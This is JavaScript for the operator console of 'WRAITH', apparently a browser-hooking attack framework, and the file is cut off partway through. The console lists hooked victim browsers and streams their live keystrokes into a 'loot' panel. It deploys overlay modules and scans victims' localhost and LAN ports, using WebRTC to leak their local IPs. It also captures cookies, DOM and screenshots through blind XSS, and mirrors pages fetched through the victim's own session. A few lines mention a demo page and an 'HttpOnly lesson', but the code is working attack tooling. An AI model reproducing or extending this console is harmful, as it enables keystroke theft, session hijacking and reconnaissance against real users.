/* WRAITH operator console ---------------------------------------------- */
(function () {
  'use strict';

  // optional ?key=... is forwarded to the server gate
  var key = new URLSearchParams(location.search).get('key');
  var WS = location.origin.replace(/^http/, 'ws') + '/ws/operator' + (key ? '?key=' + encodeURIComponent(key) : '');

  var $ = function (id) { return document.getElementById(id); };
  var conn = $('conn'), connText = $('connText');
  var victimList = $('victimList'), vcount = $('vcount');
  var detailEl = $('detail');
  var feedEl = $('feed'), lootEl = $('loot'), lootCount = $('lootCount');

  var state = {
    victims: [], selected: null, modules: [], loot: [], typing: {},
    scan: {},     // victimId -> scan state
    capture: {},  // victimId -> { meta, cookies[], dom, screenshot, info[], running }
    mirror: {},   // victimId -> { fetched:[{url,finalUrl,html,...}], idx, loading }
    scanParams: { mode: 'localhost', target: '127.0.0.1',
                  ports: '3000,3001,4200,5173,8000,8080,8443,8888,9229,5000,9000,5432,3306,6379,27017,9200,5601,2375,11434,1234,7860,3389,5900,5938,6568,631,9090,8200' }
  };
  function blankScan() {
    return { localIp: null, info: [], hosts: [], ports: [], running: false, warn: '',
             total: 0, done: 0, last: null, mode: '', target: '', startedAt: 0, endedAt: 0 };
  }

  // ---- WebSocket --------------------------------------------------------
  var ws, backoff = 1000;
  function connect() {
    ws = new WebSocket(WS);
    ws.onopen = function () { conn.classList.add('up'); connText.textContent = 'connected'; backoff = 1000; };
    ws.onclose = function () {
      conn.classList.remove('up'); connText.textContent = 'reconnecting…';
      setTimeout(connect, backoff); backoff = Math.min(backoff * 1.6, 10000);
    };
    ws.onerror = function () { try { ws.close(); } catch (e) {} };
    ws.onmessage = function (ev) {
      var m; try { m = JSON.parse(ev.data); } catch (e) { return; }
      handle(m);
    };
  }
  function sendCmd(o) { if (ws && ws.readyState === 1) ws.send(JSON.stringify(o)); }

  function handle(m) {
    if (m.type === 'hello') { state.modules = m.modules || []; }
    else if (m.type === 'snapshot') { onSnapshot(m); }
    else if (m.type === 'roster') { state.victims = m.victims; renderVictims(); renderDetail(); }
    else if (m.type === 'event') { logEvent(m); }
    else if (m.type === 'keystroke') { onKeystroke(m); }
    else if (m.type === 'capture') { onCapture(m); }
    else if (m.type === 'task-result') { onTaskResult(m); }
    else if (m.type === 'task-done') { onTaskDone(m); }
    else if (m.type === 'mirror-page') { onMirrorPage(m); }
  }

  // ---- helpers ----------------------------------------------------------
  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }
  function ts(t) {
    var d = t ? new Date(t) : new Date();
    return d.toTimeString().slice(0, 8);
  }
  function ago(t) {
    var s = Math.floor((Date.now() - t) / 1000);
    if (s < 60) return s + 's ago';
    if (s < 3600) return Math.floor(s / 60) + 'm ago';
    return Math.floor(s / 3600) + 'h ago';
  }
  function vget(id) { return state.victims.find(function (v) { return v.id === id; }); }

  // Full-history restore sent by the server on connect — rebuilds the console
  // after a refresh/reconnect (or a server restart) so nothing is lost.
  function onSnapshot(m) {
    state.victims = m.victims || [];
    state.capture = m.capture || {};
    state.scan = m.scan || {};
    var pages = m.pages || {};
    state.mirror = {};
    Object.keys(pages).forEach(function (id) {
      state.mirror[id] = { fetched: pages[id] || [], idx: 0, loading: false };
    });
    state.loot = (m.loot || []).map(function (l) {
      return { type: 'capture', victimId: l.victimId, module: l.module, data: l.data, at: l.at };
    });
    feedEl.innerHTML = '';
    (m.feed || []).forEach(function (e) {
      logLine(e.level || 'cmd', '[' + (e.victimId || '-') + '] ' + e.text, e.at);
    });
    renderVictims();
    renderDetail();
    renderLoot();
  }

  // ---- victims list -----------------------------------------------------
  function renderVictims() {
    vcount.textContent = state.victims.filter(function (v) { return v.online; }).length;
    victimList.innerHTML = '';
    if (!state.victims.length) {
      var empty = el('div', { 'class': 'empty' }, 'No browsers hooked yet.');
      empty.appendChild(el('small', null, 'Open the demo page in a browser.'));
      victimList.appendChild(empty);
      return;
    }
    // online first, then most recent
    var sorted = state.victims.slice().sort(function (a, b) {
      return (b.online - a.online) || (b.lastSeen - a.lastSeen);
    });
    sorted.forEach(function (v) {
      // status sub-tags: live/lost hook + whether blind-XSS loot has landed.
      var cap = state.capture[v.id];
      var bxss = cap && (cap.meta || cap.dom || cap.screenshot);
      var card = el('div', { 'class': 'vcard' + (state.selected === v.id ? ' sel' : ''), 'data-id': v.id });
      var row1 = el('div', { 'class': 'row1' });
      row1.appendChild(el('span', { 'class': 'vstat' + (v.online ? '' : ' off') }));
      row1.appendChild(el('span', { 'class': 'id' }, v.id));
      row1.appendChild(el('span', { 'class': 'when' }, v.online ? 'online' : ago(v.lastSeen)));
      // static trusted markup only (fixed SVG) -- no victim data in this string
      var trash = el('button', { 'class': 'vdel', type: 'button', 'data-del': v.id,
        title: 'Remove from list (keeps saved data)', 'aria-label': 'Remove from list' });
      trash.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" ' +
        'stroke-linecap="round" stroke-linejoin="round">' +
        '<path d="M3 6h18"/><path d="M8 6V4h8v2"/><path d="M6 6l1 14h10l1-14"/><path d="M10 11v6M14 11v6"/></svg>';
      row1.appendChild(trash);
      card.appendChild(row1);
      card.appendChild(el('div', { 'class': 'meta' },
        (v.fp.browser || '?') + ' · ' + (v.fp.os || '?') + ' · ' + (v.fp.ip || '?')));
      var vtags = el('div', { 'class': 'vtags' });
      vtags.appendChild(el('span', { 'class': 'vtag ' + (v.online ? 'live' : 'lost') },
        v.online ? 'live hooked' : 'hook lost'));
      if (bxss) vtags.appendChild(el('span', { 'class': 'vtag bxss' }, '✓ bxss fired'));
      if (v.activeModule) vtags.appendChild(el('span', { 'class': 'vtag overlay' }, 'overlay: ' + v.activeModule));
      card.appendChild(vtags);
      victimList.appendChild(card);
    });
    [].forEach.call(victimList.querySelectorAll('.vcard'), function (c) {
      c.onclick = function () { state.selected = c.getAttribute('data-id'); renderVictims(); renderDetail(); };
    });
    [].forEach.call(victimList.querySelectorAll('.vdel'), function (b) {
      b.onclick = function (e) {
        e.stopPropagation();          // don't select the card we're removing
        var id = b.getAttribute('data-del');
        sendCmd({ type: 'hide', victimId: id });   // hides the card, keeps stored data
        if (state.selected === id) { state.selected = null; renderDetail(); }
      };
    });
  }

  // ---- target detail + deploy ------------------------------------------
  function renderDetail() {
    var v = state.selected && vget(state.selected);
    if (!v) { detailEl.innerHTML = '<div class="empty">Select a hooked browser on the left.</div>'; return; }

    var fp = v.fp || {};
    var dis = v.online ? '' : ' disabled';
    var overlays = state.modules.filter(function (m) { return m.kind !== 'task'; });
    var hasScan = state.modules.some(function (m) { return m.id === 'portscan'; });
    var reconTasks = state.modules.filter(function (m) { return m.kind === 'task' && m.id !== 'portscan'; });

    // Static scaffold: trusted markup only, no victim data interpolated here.
    // Victim-derived values are filled in via DOM below.
    detailEl.innerHTML =
      '<div class="row1" style="display:flex;align-items:center;gap:10px;margin-bottom:14px">' +
        '<span class="vstat"></span>' +
        '<span class="id" style="font-family:var(--mono);color:var(--accent);font-size:16px;font-weight:700"></span>' +
        '<span style="color:var(--muted)"></span></div>' +
      '<dl class="fp-grid"></dl>' +
      '<button class="btn mirror-open" id="btnMirror" type="button">' +
        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">' +
        '<rect x="2.5" y="4" width="19" height="13" rx="1.5"/><path d="M9 20h6M12 17v3"/></svg>' +
        'Open page mirror</button>' +
      '<div class="section-label">Deploy overlay</div>' +
      '<div class="modules"></div>';

    detailEl.querySelector('.vstat').setAttribute('class', 'vstat' + (v.online ? '' : ' off'));
    detailEl.querySelector('.id').textContent = v.id;
    detailEl.querySelector('.row1 span[style]').textContent =
      v.online ? 'online' : 'offline · ' + ago(v.lastSeen);

    var grid = detailEl.querySelector('.fp-grid');
    [
      ['Browser', (fp.browser || '?') + ' / ' + (fp.os || '?')],
      ['IP', fp.ip || '?'],
      ['Origin', fp.origin || '?'],
      ['Cookies', (fp.cookies != null ? fp.cookies + ' JS-readable' : '?')],
      ['Language', fp.lang || '?'],
      ['Screen', fp.screen || '?'],
      ['Page', fp.page || '?'],
      ['Title', fp.title || '?'],
      ['User-Agent', fp.ua || '?']
    ].forEach(function (r) {
      grid.appendChild(el('dt', null, r[0]));
      grid.appendChild(el('dd', null, r[1]));
    });

    var modList = detailEl.querySelector('.modules');
    overlays.forEach(function (m) {
      var b = el('button', { 'class': 'mbtn', 'data-mod': m.id });
      if (!v.online) b.setAttribute('disabled', '');
      b.appendChild(el('div', { 'class': 'mt' }, m.label));
      b.appendChild(el('div', { 'class': 'mb' }, m.blurb));
      modList.appendChild(b);
    });

    // scanFormHTML/reconHTML embed operator-owned form state and the server
    // module catalog only -- no victim/session data -- so their templated
    // innerHTML stays. v.id is a server-generated 8-char UUID (not attacker
    // data) used for element scoping.
    if (hasScan) detailEl.insertAdjacentHTML('beforeend', scanFormHTML(v));
    if (reconTasks.length) detailEl.insertAdjacentHTML('beforeend', reconHTML(v, reconTasks));
    detailEl.insertAdjacentHTML('beforeend',
      '<div class="actions">' +
        '<button class="btn recall" id="btnRecall"' + dis + '>Recall / stop</button>' +
        '<button class="btn ghost" id="btnForget">Forget browser</button>' +
      '</div>' +
      '<div class="live-typing"><div class="ll">Live keystrokes</div><div id="typing"></div></div>');

    [].forEach.call(detailEl.querySelectorAll('.mbtn[data-mod]'), function (b) {
      b.onclick = function () { sendCmd({ type: 'deploy', victimId: v.id, moduleId: b.getAttribute('data-mod') }); };
    });
    [].forEach.call(detailEl.querySelectorAll('.mbtn[data-task]'), function (b) {
      b.onclick = function () {
        state.capture[v.id] = { meta: null, cookies: [], dom: null, screenshot: null, info: [], running: true, at: Date.now() };
        sendCmd({ type: 'deploy', victimId: v.id, moduleId: b.getAttribute('data-task'), params: {} });
        renderCapture();
      };
    });
    var mb = $('btnMirror'); if (mb) mb.onclick = function () { openMirror(v.id); };
    var rc = $('btnRecall'); if (rc) rc.onclick = function () { sendCmd({ type: 'recall', victimId: v.id }); };
    var fg = $('btnForget'); if (fg) fg.onclick = function () {
      sendCmd({ type: 'forget', victimId: v.id });
      if (state.selected === v.id) state.selected = null;
    };
    if (hasScan) wireScanForm(v);
    renderTyping();
    renderScanResults();
    renderCapture();
  }

  function reconHTML(v, tasks) {
    var dis = v.online ? '' : ' disabled';
    var btns = tasks.map(function (m) {
      return '<button class="mbtn" data-task="' + esc(m.id) + '"' + dis + '>' +
        '<div class="mt">' + esc(m.label) + '</div><div class="mb">' + esc(m.blurb) + '</div></button>';
    }).join('');
    return '<div class="section-label">Recon &amp; blind-XSS capture' +
      '<span class="hint">grabs origin · cookies · DOM · screenshot</span></div>' +
      '<div class="modules">' + btns + '</div>' +
      '<div id="captureResults" class="capture-results"></div>';
  }

  // ---- local network scan UI -------------------------------------------
  function scanFormHTML(v) {
    var p = state.scanParams, dis = v.online ? '' : ' disabled';
    var showPorts = p.mode !== 'discover';
    var showTarget = p.mode !== 'localhost';
    var hint = p.mode === 'localhost'
      ? 'calibrated 127.0.0.1 scan · reliable in Chrome & Firefox today'
      : 'LAN targets are gated by Local Network Access (Chrome 142+) · Firefox is more permissive';

    var portsRow = showPorts
      ? '<label class="sf-lab">Ports<input id="sfPorts" class="sf-in" value="' + esc(p.ports) + '"' + dis + '/></label>'
      : '';
    var targetRow = showTarget
      ? '<label class="sf-lab">Target<input id="sfTarget" class="sf-in" value="' + esc(p.target) + '"' + dis +
        ' placeholder="' + (p.mode === 'discover' ? '192.168.1.1-254' : '192.168.1.1') + '"/></label>'
      : '<label class="sf-lab">Target<input class="sf-in" value="127.0.0.1 (this machine)" disabled/></label>';

    return '<div class="section-label">Local / localhost scan' +
      '<span class="hint">' + hint + '</span></div>' +
      '<div class="scanform">' +
        '<div class="sf-row">' +
          '<label class="sf-lab">Mode' +
            '<select id="sfMode" class="sf-in"' + dis + '>' +
              '<option value="localhost"' + (p.mode === 'localhost' ? ' selected' : '') + '>This machine (localhost)</option>' +
              '<option value="host"' + (p.mode === 'host' ? ' selected' : '') + '>LAN host</option>' +
              '<option value="discover"' + (p.mode === 'discover' ? ' selected' : '') + '>Discover LAN hosts</option>' +
            '</select></label>' +
          targetRow +
        '</div>' +
        '<div class="sf-row" id="sfPortsRow">' + portsRow + '</div>' +
        '<button class="btn run" id="btnScan"' + dis + '>Run scan</button>' +
      '</div>' +
      '<div id="scanResults" class="scan-results"></div>';
  }

  function readScanForm() {
    var mode = $('sfMode') ? $('sfMode').value : state.scanParams.mode;
    var target = mode === 'localhost' ? '127.0.0.1'
               : ($('sfTarget') ? $('sfTarget').value.trim() : state.scanParams.target);
    var portsStr = $('sfPorts') ? $('sfPorts').value : state.scanParams.ports;
    state.scanParams.mode = mode;
    if (mode !== 'localhost') state.scanParams.target = target;
    if ($('sfPorts')) state.scanParams.ports = portsStr;
    var ports = String(portsStr).split(',').map(function (x) { return parseInt(x.trim(), 10); })
                  .filter(function (x) { return x > 0 && x < 65536; });
    return { mode: mode, target: target, ports: ports, timeout: 2200, concurrency: 12 };
  }

  function wireScanForm(v) {
    var mode = $('sfMode'), target = $('sfTarget'), ports = $('sfPorts'), btn = $('btnScan');
    if (mode) mode.onchange = function () {
      state.scanParams.mode = mode.value;
      renderDetail(); // re-render to show/hide target + ports per mode
    };
    if (target) target.oninput = function () { state.scanParams.target = target.value; };
    if (ports) ports.oninput = function () { state.scanParams.ports = ports.value; };
    if (btn) btn.onclick = function () {
      var params = readScanForm();
      var s = state.scan[v.id] = blankScan();
      s.running = true; s.startedAt = Date.now();
      s.mode = params.mode; s.target = params.target;
      s.total = params.mode === 'discover' ? 0 : params.ports.length;
      sendCmd({ type: 'deploy', victimId: v.id, moduleId: 'portscan', params: params });
      renderScanResults();
    };
  }

  function renderScanResults() {
    var box = $('scanResults'); if (!box) return;
    var s = state.scan[state.selected];
    if (!s || (!s.startedAt && !s.info.length && !s.hosts.length && !s.ports.length && !s.localIp)) {
      box.innerHTML = '';
      return;
    }
    box.innerHTML = '';
    var wrap = el('div');

    // ---- progress header (the "is it working?" answer) ----
    if (s.startedAt) {
      var pct = s.total ? Math.min(100, Math.round((s.done / s.total) * 100)) : (s.running ? 0 : 100);
      var endT = s.endedAt || Date.now();
      var elapsed = ((endT - s.startedAt) / 1000).toFixed(1);
      var rate = s.done && elapsed > 0 ? (s.done / elapsed).toFixed(0) : 0;

      var tally = { open: 0, filtered: 0, closed: 0, blocked: 0 };
      s.ports.forEach(function (p) { if (tally[p.status] != null) tally[p.status]++; });

      var prog = el('div', { 'class': 'sr-progress' + (s.running ? ' running' : ' done') });
      var top = el('div', { 'class': 'srp-top' });
      var ttl = el('span', { 'class': 'srp-title' });
      ttl.appendChild(s.running ? el('span', { 'class': 'srp-spin' }) : el('span', { 'class': 'srp-check' }, '✓'));
      ttl.appendChild(document.createTextNode(s.running ? 'Scanning ' : 'Scan complete '));
      ttl.appendChild(el('b', null, s.target || ''));
      top.appendChild(ttl);
      var meta = el('span', { 'class': 'srp-meta' });
      meta.appendChild(document.createTextNode(
        (s.total ? (s.done + ' / ' + s.total + ' · ' + pct + '%') : (s.done + ' probed')) +
        ' · ' + elapsed + 's' + (s.running && rate ? ' · ' + rate + '/s' : '')));
      top.appendChild(meta);
      prog.appendChild(top);
      var track = el('div', { 'class': 'srp-track' });
      var fill = el('div', { 'class': 'srp-fill' });
      fill.style.width = pct + '%';
      track.appendChild(fill);
      prog.appendChild(track);
      var stats = el('div', { 'class': 'srp-stats' });
      if (s.mode === 'discover') {
        stats.appendChild(el('span', { 'class': 'srs up' }, s.hosts.length + ' up'));
        stats.appendChild(el('span', { 'class': 'srs' }, s.done + ' probed'));
      } else {
        stats.appendChild(el('span', { 'class': 'srs open' }, tally.open + ' open'));
        if (tally.filtered) stats.appendChild(el('span', { 'class': 'srs filtered' }, tally.filtered + ' filtered'));
        stats.appendChild(el('span', { 'class': 'srs closed' }, tally.closed + ' closed'));
        if (tally.blocked) stats.appendChild(el('span', { 'class': 'srs blocked' }, tally.blocked + ' blocked'));
      }
      prog.appendChild(stats);
      wrap.appendChild(prog);
    }

    if (s.localIp) {
      var lip = el('div', { 'class': 'sr-info' }, 'local IP leaked via WebRTC: ');
      lip.appendChild(el('b', null, s.localIp));
      wrap.appendChild(lip);
    }
    s.info.forEach(function (t) { wrap.appendChild(el('div', { 'class': 'sr-info' }, t)); });

    if (s.hosts.length) {
      var grid = el('div', { 'class': 'sr-grid' });
      s.hosts.forEach(function (h) {
        var cell = el('div', { 'class': 'sr-cell up' });
        cell.appendChild(el('b', null, h.host));
        cell.appendChild(el('span', null, h.note || 'up'));
        grid.appendChild(cell);
      });
      wrap.appendChild(grid);
    }
    if (s.ports.length) {
      var order = { open: 0, filtered: 1, blocked: 2, closed: 3 };
      var sorted = s.ports.slice().sort(function (a, b) {
        return (order[a.status] - order[b.status]) || (a.port - b.port);
      });
      var pgrid = el('div', { 'class': 'sr-ports' });
      sorted.forEach(function (pr) {
        var cls = ['open', 'filtered', 'blocked', 'closed'].indexOf(pr.status) >= 0 ? pr.status : 'unknown';
        var chip = el('span', { 'class': 'sr-port ' + cls + (pr.agree === 'both' ? ' agree' : '') });
        chip.appendChild(document.createTextNode(pr.port));
        if (pr.service && pr.status === 'open') chip.appendChild(el('em', null, ' ' + pr.service));
        if (pr.wsStatus != null) {
          var sigs = el('span', { 'class': 'sigs' });
          sigs.appendChild(el('b', { 'class': pr.fetchStatus === 'open' ? 'on' : 'off' }, 'fetch ' + pr.fetchMs + 'ms'));
          sigs.appendChild(el('b', { 'class': pr.wsStatus === 'open' ? 'on' : 'off' }, 'ws ' + pr.wsMs + 'ms'));
          chip.appendChild(sigs);
          chip.appendChild(el('i', null, pr.status === 'open' ? 'open' : 'closed'));
        } else {
          chip.appendChild(el('i', null, pr.status === 'open' ? ('open · ' + pr.ms + 'ms') : String(pr.status)));
        }
        pgrid.appendChild(chip);
      });
      wrap.appendChild(pgrid);
    }

    // browser-policy block warning (emitted by the scanner when it detects it)
    if (s.warn) wrap.appendChild(el('div', { 'class': 'sr-warn' }, s.warn));
    box.appendChild(wrap);
  }

  function onTaskResult(m) {
    if (m.task === 'capture') return onCaptureResult(m);
    var s = state.scan[m.victimId] = state.scan[m.victimId] || blankScan();
    s.running = true;
    var r = m.result || {};
    if (r.kind === 'start') {
      s.total = r.total || 0; s.done = 0; s.mode = r.mode || ''; s.target = r.target || '';
      s.startedAt = Date.now(); s.endedAt = 0;
    }
    else if (r.kind === 'progress') { s.done = r.done || s.done; s.last = r.last; }
    else if (r.kind === 'warn') s.warn = r.text;
    else if (r.kind === 'local-ip') s.localIp = r.ip;
    else if (r.kind === 'info') s.info.push(r.text);
    else if (r.kind === 'host') { s.hosts.push(r); logLine('cmd', '[' + m.victimId + '] host up: ' + r.host + ' (' + (r.note || '') + ')'); }
    else if (r.kind === 'port') {
      s.ports.push(r);
      if (r.status === 'open') logLine('loot', '[' + m.victimId + '] OPEN ' + r.host + ':' + r.port + ' (' + r.ms + 'ms)');
    }
    if (m.victimId === state.selected) renderScanResults();
  }

  function onTaskDone(m) {
    if (m.task === 'capture') return onCaptureDone(m);
    var s = state.scan[m.victimId];
    if (s) { s.running = false; s.endedAt = Date.now(); if (s.total) s.done = s.total; }
    var sum = m.summary || {};
    var txt = sum.error ? ('scan error: ' + sum.error)
      : sum.mode === 'discover' ? ('discovery done · ' + sum.up + ' live host(s) of ' + sum.scanned)
      : ('port scan done · ' + (sum.open || 0) + ' open of ' + sum.scanned);
    logLine('cmd', '[' + m.victimId + '] ' + txt);
    if (m.victimId === state.selected) renderScanResults();
  }

  // ---- page capture (blind-XSS loot) -----------------------------------
  function onCaptureResult(m) {
    var c = state.capture[m.victimId] = state.capture[m.victimId] ||
      { meta: null, cookies: [], dom: null, screenshot: null, info: [], running: true, at: Date.now() };
    c.running = true;
    var r = m.result || {};
    if (r.kind === 'meta') c.meta = r;
    else if (r.kind === 'cookies') c.cookies = r.cookies || [];
    else if (r.kind === 'dom') c.dom = { length: r.length, truncated: r.truncated, html: r.html };
    else if (r.kind === 'screenshot') { c.screenshot = r.dataUrl; c.shotDims = (r.w && r.h) ? (r.w + '×' + r.h) : ''; }
    else if (r.kind === 'info') c.info.push(r.text);
    logLine('cmd', '[' + m.victimId + '] capture: ' + (r.kind === 'info' ? r.text : r.kind));
    // first loot signal flips the sidebar's "bxss fired" tag — refresh the roster.
    if (r.kind === 'meta') renderVictims();
    if (m.victimId === state.selected) renderCapture();
  }

  function onCaptureDone(m) {
    var c = state.capture[m.victimId]; if (c) c.running = false;
    logLine('cmd', '[' + m.victimId + '] page capture complete');
    renderVictims();
    if (m.victimId === state.selected) renderCapture();
  }

  // ---- DOM builder: the only sanctioned way to render attacker-influenced
  // values. textContent/setAttribute are the boundary -- no esc()/regex to
  // remember. NOTE: setAttribute does NOT make URL attributes safe (a
  // javascript: href still executes on click) -- URL contexts need the scheme
  // check below. That is input validation, not escaping.
  function el(tag, attrs, text) {
    var e = document.createElement(tag);
    if (attrs) for (var k in attrs) e.setAttribute(k, attrs[k]);
    if (text != null) e.textContent = text;
    return e;
  }
  function isShotUrl(u) { return typeof u === 'string' && u.lastIndexOf('data:image/', 0) === 0; }

  function renderCapture() {
    var box = $('captureResults'); if (!box) return;
    var c = state.capture[state.selected];
    box.innerHTML = '';
    if (!c) return;
    var meta = c.meta || {};

    var card = el('div', { 'class': 'cap-card' });
    var head = el('div', { 'class': 'cap-head' });
    head.appendChild(el('span', { 'class': 'cap-dot' }));
    head.appendChild(document.createTextNode('Page Capture'));
    head.appendChild(el('span', { 'class': c.running ? 'cap-run' : 'cap-ok' }, c.running ? 'capturing…' : '✓ done'));
    card.appendChild(head);

    if (meta.origin) {
      var metas = el('div', { 'class': 'cap-metas' });
      [['origin', meta.origin], ['url', meta.href || ''], ['referrer', meta.referrer]].forEach(function (kv) {
        if (!kv[1]) return;
        var d = el('div');
        d.appendChild(el('span', null, kv[0]));
        d.appendChild(el('b', null, String(kv[1])));
        metas.appendChild(d);
      });
      card.appendChild(metas);
    }

    var sub1 = el('div', { 'class': 'cap-sub' }, 'Cookies ');
    sub1.appendChild(el('em', null, '(JS-readable / non-HttpOnly)'));
    card.appendChild(sub1);
    if (c.cookies && c.cookies.length) {
      var ck = el('div', { 'class': 'cap-cookies' });
      c.cookies.forEach(function (k) {
        var row = el('div', { 'class': 'ck' });
        row.appendChild(el('span', { 'class': 'ckn' }, k.name));
        row.appendChild(el('span', { 'class': 'ckv' }, k.value));
        ck.appendChild(row);
      });
      card.appendChild(ck);
    } else if (!c.running) {
      card.appendChild(el('div', { 'class': 'cap-empty' }, 'none readable — all HttpOnly, or none set. That is the HttpOnly lesson.'));
    } else {
      card.appendChild(el('div', { 'class': 'cap-empty' }, '…'));
    }

    card.appendChild(el('div', { 'class': 'cap-sub' }, 'Screenshot'));
    if (c.screenshot && !isShotUrl(c.screenshot)) {
      card.appendChild(el('div', { 'class': 'cap-empty' }, 'screenshot rejected — not an image data URL (possible injection attempt)'));
    } else if (c.screenshot) {
      var a = el('a', { 'class': 'cap-shot', href: c.screenshot, target: '_blank', rel: 'noopener' });
      a.appendChild(el('img', { src: c.screenshot, alt: 'captured screenshot' }));
      card.appendChild(a);
      if (c.shotDims) card.appendChild(el('div', { 'class': 'cap-dim' }, String(c.shotDims)));
    } else if (c.running) {
      card.appendChild(el('div', { 'class': 'cap-empty' }, 'rendering…'));
    } else {
      card.appendChild(el('div', { 'class': 'cap-empty' }, 'no screenshot (see notes)'));
    }

    card.appendChild(el('div', { 'class': 'cap-sub' }, 'DOM'));
    var pre = null;
    if (c.dom) {
      var kb = (c.dom.length / 1024).toFixed(1);
      var row = el('div', { 'class': 'cap-domrow' });
      var span = el('span', null, kb + ' KB' + (c.dom.truncated ? ' (truncated to 1.5MB)' : ''));
      row.appendChild(span);
      row.appendChild(el('button', { 'class': 'mini', id: 'capView' }, 'Preview'));
      row.appendChild(el('button', { 'class': 'mini', id: 'capDl' }, 'Download HTML'));
      pre = el('pre', { 'class': 'cap-dom', id: 'capDom' });
      pre.style.display = 'none';
      row.appendChild(pre);
      card.appendChild(row);
    } else if (c.running) {
      card.appendChild(el('div', { 'class': 'cap-empty' }, 'collecting…'));
    }

    if (c.info && c.info.length) {
      var notes = el('div', { 'class': 'cap-notes' });
      c.info.forEach(function (t) { notes.appendChild(el('div', null, '• ' + t)); });
      card.appendChild(notes);
    }
    box.appendChild(card);

    var dl = $('capDl'), vw = $('capView');
    if (dl && c.dom) dl.onclick = function () {
      var a = document.createElement('a');
      a.href = URL.createObjectURL(new Blob([c.dom.html], { type: 'text/html' }));
      a.download = 'capture-' + state.selected + '.html';
      document.body.appendChild(a); a.click();
      setTimeout(function () { URL.revokeObjectURL(a.href); a.remove(); }, 1000);
    };
    if (vw && pre && c.dom) vw.onclick = function () {
      if (pre.style.display === 'none') {
        pre.textContent = c.dom.html.slice(0, 8000) + (c.dom.html.length > 8000 ? '\n…' : '');
        pre.style.display = 'block'; vw.textContent = 'Hide';
      } else { pre.style.display = 'none'; vw.textContent = 'Preview'; }
    };
  }

  function renderTyping() {
    var box = $('typing'); if (!box) return;
    var t = state.typing[state.selected];
    box.innerHTML = '';
    if (!t || !Object.keys(t).length) {
      var wait = el('div', { 'class': 'kv' });
      wait.appendChild(el('span', { 'class': 'v empty-val' }, 'waiting for input…'));
      box.appendChild(wait);
      return;
    }
    Object.keys(t).forEach(function (f) {
      var row = el('div', { 'class': 'kv' });
      row.appendChild(el('span', { 'class': 'k' }, f));
      row.appendChild(t[f] ? el('span', { 'class': 'v' }, t[f]) : el('span', { 'class': 'v empty-val' }, '…'));
      box.appendChild(row);
    });
  }

  // ---- live keystrokes --------------------------------------------------
  function onKeystroke(m) {
    state.typing[m.victimId] = state.typing[m.victimId] || {};
    state.typing[m.victimId][m.field] = m.value;
    if (m.victimId === state.selected) renderTyping();
    // also drop a compact line in the feed
    logLine('key', '[' + m.victimId + '] ' + m.field + ' = ' + (m.value || ''));
  }

  // ---- captures (loot) --------------------------------------------------
  function onCapture(m) {
    state.loot.unshift(m);
    state.typing[m.victimId] = {}; // clear live buffer after submit
    if (m.victimId === state.selected) renderTyping();
    renderLoot();
  }
  function renderLoot() {
    lootCount.textContent = state.loot.length;
    lootEl.innerHTML = '';
    if (!state.loot.length) { lootEl.appendChild(el('div', { 'class': 'empty' }, 'Nothing captured yet.')); return; }
    state.loot.forEach(function (l) {
      var card = el('div', { 'class': 'lcard' });
      var lh = el('div', { 'class': 'lh' });
      lh.appendChild(el('span', { 'class': 'tag' }, l.module));
      lh.appendChild(el('span', null, l.victimId));
      lh.appendChild(el('span', { 'class': 'when' }, new Date(l.at).toLocaleTimeString()));
      card.appendChild(lh);
      Object.keys(l.data || {}).forEach(function (k) {
        var row = el('div', { 'class': 'lrow' });
        row.appendChild(el('span', { 'class': 'k' }, k));
        row.appendChild(el('span', { 'class': 'v' }, l.data[k]));
        card.appendChild(row);
      });
      lootEl.appendChild(card);
    });
  }

  // ---- feed -------------------------------------------------------------
  function logEvent(m) { logLine(m.level || 'cmd', '[' + (m.victimId || '-') + '] ' + m.text, m.at); }
  function logLine(cls, text, at) {
    var d = el('div', { 'class': 'fline ' + cls });
    d.appendChild(el('span', { 'class': 'ts' }, ts(at)));
    d.appendChild(el('span', null, text));
    feedEl.appendChild(d);
    while (feedEl.children.length > 400) feedEl.removeChild(feedEl.firstChild);
    feedEl.scrollTop = feedEl.scrollHeight;
  }
  $('clearFeed').onclick = function () { feedEl.innerHTML = ''; };

  // refresh "ago" timers
  setInterval(function () { if (state.victims.some(function (v) { return !v.online; })) renderVictims(); }, 10000);

  // keep the scan progress header ticking (elapsed + spinner) between messages
  setInterval(function () {
    var s = state.scan[state.selected];
    if (s && s.running) renderScanResults();
  }, 500);

  // ---- page mirror ------------------------------------------------------
  // Recreate the victim's page in the console and let the operator click links;
  // each click is fetched THROUGH the victim (same-origin, carries their cookies)
  // and the returned HTML is stored + shown. The captured DOM is the "home" page,
  // so a recreation exists even for an offline session.
  var mirrorVictim = null, mmModal = null, mmFrame = null;

  function escAttr(s) { return String(s == null ? '' : s).replace(/"/g, '&quot;'); }

  function mirrorList(id) {
    var list = [];
    var c = state.capture[id];
    if (c && c.dom && c.dom.html) {
      var href = (c.meta && c.meta.href) || (c.meta && c.meta.origin) || '';
      list.push({ home: true, url: href, finalUrl: href, html: c.dom.html, status: 200, at: c.at });
    }
    var m = state.mirror[id];
    if (m && m.fetched) list = list.concat(m.fetched);
    return list;
  }

  function openMirror(id) {
    mirrorVictim = id;
    var m = state.mirror[id] = state.mirror[id] || { fetched: [], idx: 0, loading: false };
    var n = mirrorList(id).length;
    m.idx = n ? n - 1 : 0;
    m.loading = false;
    mmModal.hidden = false;
    renderMirror();
  }
  function closeMirror() {
    mirrorVictim = null;
    if (mmFrame) mmFrame.srcdoc = '';
    if (mmModal) mmModal.hidden = true;
  }

  // Rebuild a stored page for display: strip the victim page's own scripts (so
  // they can't run in the console), add a <base> so links/resources resolve, and
  // inject a tiny script that routes link clicks back to us via postMessage.
  function mirrorDoc(page) {
    var html = (page.html || '').replace(/<script[\s\S]*?<\/script>/gi, '');
    var base = '<base href="' + escAttr(page.finalUrl || page.url || '') + '">';
    var s = '<scr' + 'ipt>(function(){' +
      'function nav(u){try{parent.postMessage({from:"wraith-mirror",href:u},"*")}catch(e){}}' +
      'document.addEventListener("click",function(e){' +
      'var a=e.target&&e.target.closest?e.target.closest("a[href]"):null;' +
      'if(!a)return;e.preventDefault();e.stopPropagation();if(a.href)nav(a.href);},true);' +
      'document.addEventListener("submit",function(e){e.preventDefault()},true);' +
